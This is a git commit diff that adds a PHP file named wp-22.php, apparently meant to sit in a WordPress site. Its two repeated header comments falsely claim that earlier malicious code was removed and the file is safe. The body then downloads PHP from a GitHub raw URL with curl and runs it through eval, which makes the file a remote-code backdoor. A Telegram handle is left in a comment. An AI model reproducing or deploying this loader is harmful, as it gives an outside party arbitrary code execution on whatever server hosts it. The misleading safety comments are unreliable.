a97833fc473c134bcf115b229710941304d412c9
starkvps007 <168563466+starkvps007@users.noreply.github.com>
2024-10-08 12:29:23 +0900

    Create wp-22.php

---
+++ short/wp-22.php
@@ -0,0 +1,24 @@
+<?php 
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+?>
+<?php 
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+?>
+<?php
+#telegram @Devidluice
+ $remoteUrl = "https://raw.githubusercontent.com/starkvps007/privatefilessomanyyy/main/wp-22.php";
+  $ch = curl_init($remoteUrl);
+   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $remoteCode = curl_exec($ch);
+    if (curl_errno($ch)) {
+     die('cURL error: ' . curl_error($ch));
+     }
+   curl_close($ch);
+ eval("?>" . $remoteCode);
+?>
